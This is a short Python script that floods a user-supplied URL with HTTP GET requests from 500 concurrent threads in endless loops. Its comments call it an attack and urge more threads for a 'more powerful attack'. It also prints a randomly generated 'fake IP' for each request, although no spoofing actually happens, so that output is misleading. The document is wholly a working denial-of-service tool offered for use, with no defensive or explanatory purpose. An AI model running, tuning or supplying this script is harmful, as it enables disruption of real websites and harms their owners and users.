import socket
import os
import random
import getpass
import requests
import time
import sys
import threading

def generate_fake_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def make_request(url):
    fake_ip = generate_fake_ip()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    try:
        response = requests.get(url, headers=headers)
        print(f"Request sent to {url} from {fake_ip}. Response code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send request to {url}: {e}")

def send_traffic(target_url):
    try:
        while True:
            make_request(target_url)
            time.sleep(0.1)  # Adjust the sleep time to control the rate of requests
    except KeyboardInterrupt:
        print("Stopping the attack...")
        return

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <target_url>")
        return
    
    target_url = sys.argv[1]
    print(f"Sending traffic to {target_url}...")

    # Create multiple threads to send traffic simultaneously
    num_threads = 500  # Increase the number of threads for an even more powerful attack
    threads = []
    try:
        for _ in range(num_threads):
            thread = threading.Thread(target=send_traffic, args=(target_url,))
            thread.start()
            threads.append(thread)

        # Wait for all threads to complete
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("Stopping all threads...")
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()
